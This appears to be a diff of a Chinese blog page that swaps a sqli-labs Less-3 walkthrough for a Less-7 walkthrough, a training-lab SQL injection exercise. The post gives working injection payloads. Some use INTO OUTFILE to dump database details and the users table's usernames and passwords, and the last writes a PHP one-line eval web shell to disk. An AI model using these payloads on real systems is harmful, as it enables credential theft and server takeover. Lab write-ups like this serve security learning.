@@ -6,26 +6,26 @@
     
 
     
-    <title>sqli-labs-less-3通关笔记 | 1eAder</title>
+    <title>sqli-labs-less-7通关笔记 | 1eAder</title>
     
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
     
         <meta name="keywords" content="sqli-labs" />
     
-    <meta name="description" content="Sql注入学习笔记——基于Sqli-labs平台(Less-3)废话不多说，继续干 单引号测试 发现报错，内容为： near &apos;&apos;1&apos;&apos;) LIMIT 0,1&apos; at line 1  猜测后台语句结构为： select * from users where id = (&amp;#39;$id&amp;#39;) limit 0,1 进一步验证是否为此类结构测试index.php?id=1&amp;#39;)--+看是否">
+    <meta name="description" content="Sql注入学习笔记——基于Sqli-labs平台(Less-7)页面提示：You are in.... Use outfile...... 关键词outfile 我们知道，select查询可以对文件有操作：&amp;emsp;&amp;emsp;读取文件：load_file()&amp;emsp;&amp;emsp;导出文件:into outfile() 所以，这里应该是想让我们利用outfile的文件来查看回显，也可以选择ou">
 <meta name="keywords" content="sqli-labs">
 <meta property="og:type" content="article">
-<meta property="og:title" content="sqli-labs-less-3通关笔记">
-<meta property="og:url" content="https://leaderzhang.github.io/2018/10/19/sqli-labs-less3/index.html">
+<meta property="og:title" content="sqli-labs-less-7通关笔记">
+<meta property="og:url" content="https://leaderzhang.github.io/2018/10/23/sqli-labs-less7/index.html">
 <meta property="og:site_name" content="1eAder">
-<meta property="og:description" content="Sql注入学习笔记——基于Sqli-labs平台(Less-3)废话不多说，继续干 单引号测试 发现报错，内容为： near &apos;&apos;1&apos;&apos;) LIMIT 0,1&apos; at line 1  猜测后台语句结构为： select * from users where id = (&amp;#39;$id&amp;#39;) limit 0,1 进一步验证是否为此类结构测试index.php?id=1&amp;#39;)--+看是否">
+<meta property="og:description" content="Sql注入学习笔记——基于Sqli-labs平台(Less-7)页面提示：You are in.... Use outfile...... 关键词outfile 我们知道，select查询可以对文件有操作：&amp;emsp;&amp;emsp;读取文件：load_file()&amp;emsp;&amp;emsp;导出文件:into outfile() 所以，这里应该是想让我们利用outfile的文件来查看回显，也可以选择ou">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://i.imgur.com/Xqx5MMW.png">
-<meta property="og:updated_time" content="2018-10-19T07:31:56.486Z">
+<meta property="og:image" content="https://i.imgur.com/VBXOgfp.png">
+<meta property="og:updated_time" content="2018-10-23T05:16:35.993Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="sqli-labs-less-3通关笔记">
-<meta name="twitter:description" content="Sql注入学习笔记——基于Sqli-labs平台(Less-3)废话不多说，继续干 单引号测试 发现报错，内容为： near &apos;&apos;1&apos;&apos;) LIMIT 0,1&apos; at line 1  猜测后台语句结构为： select * from users where id = (&amp;#39;$id&amp;#39;) limit 0,1 进一步验证是否为此类结构测试index.php?id=1&amp;#39;)--+看是否">
-<meta name="twitter:image" content="https://i.imgur.com/Xqx5MMW.png">
+<meta name="twitter:title" content="sqli-labs-less-7通关笔记">
+<meta name="twitter:description" content="Sql注入学习笔记——基于Sqli-labs平台(Less-7)页面提示：You are in.... Use outfile...... 关键词outfile 我们知道，select查询可以对文件有操作：&amp;emsp;&amp;emsp;读取文件：load_file()&amp;emsp;&amp;emsp;导出文件:into outfile() 所以，这里应该是想让我们利用outfile的文件来查看回显，也可以选择ou">
+<meta name="twitter:image" content="https://i.imgur.com/VBXOgfp.png">
     
 
     
@@ -145,14 +145,14 @@
 </div>
 
                         <div class="main-body-content">
-                            <article id="pages-sqli-labs-less3" class="article article-single article-type-pages" itemscope itemprop="blogPost">
+                            <article id="pages-sqli-labs-less7" class="article article-single article-type-pages" itemscope itemprop="blogPost">
     <div class="article-inner">
         
             <header class="article-header">
                 
     
         <h1 class="article-title" itemprop="name">
-        sqli-labs-less-3通关笔记
+        sqli-labs-less-7通关笔记
         </h1>
     
 
@@ -162,8 +162,8 @@
             <div class="article-meta">
                 
     <div class="article-date">
-        <a href="/2018/10/19/sqli-labs-less3/" class="article-date">
-            <time datetime="2018-10-19T06:56:34.000Z" itemprop="datePublished">2018-10-19</time>
+        <a href="/2018/10/23/sqli-labs-less7/" class="article-date">
+            <time datetime="2018-10-23T05:15:16.000Z" itemprop="datePublished">2018-10-23</time>
         </a>
     </div>
 
@@ -179,20 +179,32 @@
         
         
         <div class="article-entry" itemprop="articleBody">
-            <h1 id="Sql注入学习笔记——基于Sqli-labs平台-Less-3"><a href="#Sql注入学习笔记——基于Sqli-labs平台-Less-3" class="headerlink" title="Sql注入学习笔记——基于Sqli-labs平台(Less-3)"></a>Sql注入学习笔记——基于Sqli-labs平台(Less-3)</h1><p>废话不多说，继续干</p>
-<p><strong>单引号测试</strong><br><img src="https://i.imgur.com/Xqx5MMW.png" alt="单引号测试"></p>
-<p>发现报错，内容为：</p>
-<pre>near ''1'') LIMIT 0,1' at line 1</pre>
-
-<p>猜测后台语句结构为：</p>
-<p><code>select * from users where id = (&#39;$id&#39;) limit 0,1</code></p>
-<p>进一步验证是否为此类结构<br>测试<code>index.php?id=1&#39;)--+</code>看是否报错</p>
-<p><img src="https://i.imgur.com/e74dEcW.png" alt="index.php?&#39;)--+测试"></p>
-<p>OK！页面正常，证明猜测的语句没有问题</p>
-<p>接下来就是老套路了，order by猜测字段数<br>我这里偷懒了，直接测试order by 3和order by 4<br><img src="https://i.imgur.com/cEv2gvT.png" alt="order by 3测试"><br><img src="https://i.imgur.com/XAh8avA.png" alt="order by 4测试"><br>可以证明有三个字段数</p>
-<p>查询回显位：<br><img src="https://i.imgur.com/SrJ8G1E.png" alt="查询回显位"></p>
-<p>接下来的操作跟前面一样，所以我还是直接最终步骤。<br>为了测试效果不一样，我取users表第三行数据</p>
-<p><img src="https://i.imgur.com/uXn7mXs.png" alt="注入成功"></p>
+            <h1 id="Sql注入学习笔记——基于Sqli-labs平台-Less-7"><a href="#Sql注入学习笔记——基于Sqli-labs平台-Less-7" class="headerlink" title="Sql注入学习笔记——基于Sqli-labs平台(Less-7)"></a>Sql注入学习笔记——基于Sqli-labs平台(Less-7)</h1><p>页面提示：<br><code>You are in.... Use outfile......</code></p>
+<p>关键词<strong>outfile</strong></p>
+<p>我们知道，select查询可以对文件有操作：<br>&emsp;&emsp;读取文件：load_file()<br>&emsp;&emsp;导出文件:into outfile()</p>
+<p>所以，这里应该是想让我们利用outfile的文件来查看回显，也可以选择outfile一句话木马来getshell。</p>
+<p>先测试单引号，会报错。<br><img src="https://i.imgur.com/VBXOgfp.png" alt="单引号报错"></p>
+<p>但是我们发现，报错信息没有像之前一样，输出一些有用的信息</p>
+<p>对id参数(闭合语句的条件)进行一波fuzz</p>
+<p>单引号测试：<code>index.php?id=1&#39;%23</code>   ===&gt;   <code>You have an error in your SQL syntax</code><br>双引号测试：<code>index.php?id=1&quot;%23</code>       ===&gt;   <code>You are in.... Use outfile......</code></p>
+<p>从以上两条信息可以推断出，<strong>单引号是闭合语句的条件之一</strong><br>接着带着单引号进行fuzz</p>
+<p>单引号加括号：<code>index.php?id=1&#39;)%23</code>  ===&gt;  <code>You have an error in your SQL syntax</code><br>单引号加两个括号:<code>index.php?id=1&#39;))%23</code> ===&gt;  <code>You are in.... Use outfile......</code><br>ok，这里我们测试出了正确的闭合语句，可以推断后端查询语句为：</p>
+<p><code>select * from users where id =((&#39;$id&#39;))</code></p>
+<p>这里为什么是直接推断单引号后面跟上括号呢？<br>&emsp;因为php脚本语言的原因，能识别的<strong>解析变量</strong>的字符就那几个，单引号、双引号、括号等</p>
+<p>接下来我们需要知道物理路径，但是这在第七关，有些麻烦，因为我们这道题相当于<strong>盲注</strong></p>
+<p>并且我们无法利用Mysql来爆php程序的物理路径</p>
+<p>所以，我们可通过盲注来获取users表的信息。但是题目要求outfile，那我们自己就给自己一个物理路径。</p>
+<p>我的目录：<code>E:\sqli-labs\Less-7</code></p>
+<p>我这里省略了order by猜字段数</p>
+<p>构造payload：<br><code>index.php?id=1&#39;)) union select database(),user(),version() into  outfile &#39;E:\\sqli-labs\\Less-7\\out1.txt&#39;%23</code></p>
+<p><img src="https://i.imgur.com/mX2mKbh.png" alt="outfile导出数据库名和用户名还有版本信息"></p>
+<p>我们可以查询users表的数据：</p>
+<p>payload:<br><code>index.php?id=1&#39;)) union select 1,username,password from users into  outfile &#39;E:\\sqli-labs\\Less-7\\out2.txt&#39;%23</code><br><img src="https://i.imgur.com/eQ34lBA.png" alt="导出users表数据"></p>
+<hr>
+<p>其实这里我们可以直接生成一句话木马来getshell，这样操作方便些。</p>
+<p>payload：<br><code>index.php?id=1&#39;)) union select 1,2,&quot;&lt;?php @eval($_POST[&#39;leader&#39;]);?&gt;&quot; into  outfile &#39;E:\\sqli-labs\\Less-7\\muma.php&#39;%23</code></p>
+<p><img src="https://i.imgur.com/zNg3hLV.png" alt="导出写入一句话木马"></p>
+<p>OK~第七关！完成咯~</p>
 
         </div>
         <footer class="article-footer">
@@ -200,7 +212,7 @@
 
 
 
-    <a data-url="https://leaderzhang.github.io/2018/10/19/sqli-labs-less3/" data-id="cjnla1bfr000a9cnuvd2dghtf" class="article-share-link"><i class="fa fa-share"></i>分享到</a>
+    <a data-url="https://leaderzhang.github.io/2018/10/23/sqli-labs-less7/" data-id="cjnla1bfw000h9cnutyj5n8wd" class="article-share-link"><i class="fa fa-share"></i>分享到</a>
 <script>
     (function ($) {
         $('body').on('click', function() {
@@ -338,20 +350,10 @@
         
 <nav id="article-nav">
     
-        <a href="/2018/10/19/sqli-labs-less4/" id="article-nav-newer" class="article-nav-link-wrap">
-        <strong class="article-nav-caption">下一篇</strong>
-        <p class="article-nav-title">
-        
-            sqli-labs-less-4通关笔记
-        
-        </p>
-        <i class="icon fa fa-chevron-right" id="icon-chevron-right"></i>
-    </a>
     
-    
-        <a href="/2018/10/19/sqli-labs-less2/" id="article-nav-older" class="article-nav-link-wrap">
+        <a href="/2018/10/22/sqli-labs-less6/" id="article-nav-older" class="article-nav-link-wrap">
         <strong class="article-nav-caption">上一篇</strong>
-        <p class="article-nav-title">sqli-labs-less-2通关笔记</p>
+        <p class="article-nav-title">sqli-labs-less-6通关笔记</p>
         <i class="icon fa fa-chevron-left" id="icon-chevron-left"></i>
         </a>
     
@@ -565,7 +567,7 @@
     var disqus_shortname = 'hexo-theme-hueman';
     
     
-    var disqus_url = 'https://leaderzhang.github.io/2018/10/19/sqli-labs-less3/';
+    var disqus_url = 'https://leaderzhang.github.io/2018/10/23/sqli-labs-less7/';
     
     (function() {
     var dsq = document.createElement('script');
